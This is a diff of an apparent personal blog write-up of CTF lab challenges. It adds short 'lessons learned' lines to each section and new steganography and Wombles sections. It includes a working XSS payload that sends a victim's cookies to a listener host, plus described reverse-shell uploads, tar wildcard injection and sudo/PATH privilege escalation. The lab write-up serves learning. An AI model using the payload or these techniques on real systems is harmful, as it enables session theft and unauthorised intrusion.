@@ -103,6 +103,8 @@ As todhunter user, we can execute the timeout command as root.
 GTFO bins → `sudo timeout --foreground 7d /bin/sh`
 Get root! :D
 
+- SQL injection can be very bad.
+
 ## Starbug 1:
 In this site, we can upload images and view it in the star charts...
 Maybe we can bypass the image upload to upload a php reverse shell. Uploading it straight up doesn't work and just renaming the file also doesn't work.
@@ -139,6 +141,8 @@ Use another name instead...
 ![SBROOT](/SiteImages/CTFpics/Starbug1Root.png)
 
 And it worked! Get root flag.
+
+- Check uploads thoroughly. 
 
 ## Starbug 2:
 This one is the same website, but the same file upload method wont work this time. There are also log files in the system status menu that we can view:
@@ -189,6 +193,8 @@ make a file named _–checkpoint=1_ and another named _–checkpoint-action=exec
 Make these files in my _/home/starbug_ directory and backup to _/home/starbug_...
 execute _backup_ aaaaannnnnnddddd
 Drops root shell! Get root flag :)
+
+- Use wildcard wisely, not wildly. A user can find a way to change things in unexpected ways...
 
 ![Rarityhappy](/SiteImages/tumblr_m4aapqcT8O1r3k1m8o6_500.png)
 
@@ -301,6 +307,8 @@ Use – with cat to pipe stdinput into the binary.
 
 And we got root!!! Wow, my first buffer overflow :)
 
+- Careful of seg faults... Watch out for user input!
+
 ![partycannon](/SiteImages/partycannon.png)
 
 ## Marking Time:
@@ -377,7 +385,130 @@ Make sure to give evil cat execute perms...
 
 Boom! Get root and another one done.
 
+- Don't play yourself, watch the PATHs.
+
 ## Martryoshka:
 This one seems to be a steg challenge, a martryoshka is some sort of russian doll thing with more of those little dolls inside of it.
 
 It starts off with an image that has a qr code in it, needs to be changed a bit so that it can be read properly since it cant be read very well on a dark background. Change exposure with an image editor like gimp to make it white and we get our first flag!
+
+![qrcode1](/SiteImages/CTFpics/MartryoshkaQR.png)
+
+![qrcode2](/SiteImages/CTFpics/MartryoshkaQRDone.png)
+
+Using binwalk on the original image we get a few files hidden inside the image.
+
+![BINWALK1](/SiteImages/CTFpics/MartryoshkaBinwalk1.png)
+
+There are 2 other images and a flag.txt file which is inside the zip but locked with a password... having a look at the 1F7A0 image, we see an interesting roadsign...
+
+![sign](/SiteImages/CTFpics/MartryoshkaRoad1.png)
+
+Using exiftool we can find the coordinates for this image and find it on google maps!
+
+![exif1](/SiteImages/CTFpics/MartryoshkaExiftool1.png)
+
+The road ended up being headstone road. Unlock the zip file with password _headstone_ and get second flag!
+
+The second image looks to be some kind of histogram thing... 
+
+![hist](/SiteImages/CTFpics/MartryoshkaHistogram.png)
+
+Following a hint on discord, I searched google for this image:
+
+![piet](/SiteImages/CTFpics/MartryoshkaPiet.jpg)
+
+I got back, Piet Mondrian Composition with Yellow, Blue and Red.
+Turns out, there is a programming language called piet named after this bloke that makes programs look like abstract art.
+
+On this website, it lets us upload a piet program image and then executes it to display the result!
+https://www.bertnase.de/npiet/npiet-execute.php 
+Brill! We get another flag:
+
+![npiet](/SiteImages/CTFpics/MartryoshkaNpiet.png)
+
+Now one more to go... executing binwalk on the piet image will give us more files:
+
+![binwalk2](/SiteImages/CTFpics/MartryoshkaBinwalk2.png)
+
+The image contains zlib files...zlib is a software library used for data compression.
+
+Using exiftool, there is a user comment that contains the final flag:
+
+![exiftool2](/SiteImages/CTFpics/MartryoshkaExiftool2.png)
+
+- Steg is fun!
+
+## Wombles:
+First we are greeted to a web page in German.
+
+![webpagewomble](/SiteImages/CTFpics/WomblesHome.png)
+
+In robots.txt there are some directories to check out:
+
+![womblesrobots](/SiteImages/CTFpics/WomblesRobots.png)
+
+_acp_ directory gives us a page with a login box in it. The other dirs are blank pages.
+
+![womblelogin](/SiteImages/CTFpics/WomblesLogin.png)
+
+Hmm... nothing here really. Look up exploits for flatcore. Has XSS vulnerabilities...
+
+Use this as my user agent:
+`http://192.168.72.127/?name=<script>new Image().src="http://192.168.42.5:8080/bogus.php?output="+document.cookie;</script>`
+
+Set up listener on local machine...
+
+![womblesrev](/SiteImages/CTFpics/WomblesRevShell.png)
+
+Change cookie with cookie editor addon. Can access internal page without needing login details...
+Says its from _/acp/acp.php_ so try to access that...
+
+![womblesadmin](/SiteImages/CTFpics/WomblesAdmin.png)
+
+Boom! Made it to the admin panel...
+Here we can upload a php reverse shell and catch it with jumpbox...
+
+![womblephp](/SiteImages/CTFpics/WomblesPHPShell.png)
+
+Open rev shell from files menu and get a www-data shell!
+
+Found openssh key in /home/32bituser dir...
+
+![sshkey](SiteImages/CTFpics/WomblesSSHKey.png)
+
+Copy and paste onto local machine.
+Set correct permissions for private key file then ssh into the machine with the key as the 32bituser.
+
+![womblessh](SiteImages/CTFpics/WomblesSSH.png)
+
+Get user!
+There is a _secretMenu32_ file... copy to local machine by converting to base64.
+
+Checking `strings` on binary, got 2 flags already!
+
+![stringswombles](SiteImages/CTFpics/WomblesStrings.png)
+
+There also seems to be some functions we could access...
+
+![womblesfunc](SiteImages/CTFpics/WomblesFunctions.png)
+
+Very nice!
+The program asks us for input at the start, perhaps we could use BOF to change the value of the instruction pointer to point to one of these other functions...
+
+After 23 A's in the enter name part, the A's flow over into the select option part and the program shuts down since A isnt a valid option.
+
+Seems like there is a platinum area that we should try to access too...
+
+Putting _ziemni_ as the username gave me gold membership and a weird number of negative credits... buying more flags increased it by 5... do this a few more times and I have access to platinum area!
+
+![wombleplat](SiteImages/CTFpics/WomblesZiemni.png)
+
+This gives us a few more options. Unfortunately, this was as far as I managed to get, the BOF was too hard for me. There was also another very difficult BOF challenge that I couldn't do. 
+
+![raritysad](/SiteImages/tumblr_m4aapqcT8O1r3k1m8o2_400.png)
+
+But i learned a lot! 
+I was able to get pretty far in and do some stuff I've never done before, was much fun.
+- Watch out for XSS, some strings can be seen even in a compiled program... no passwords in plaintext!
+
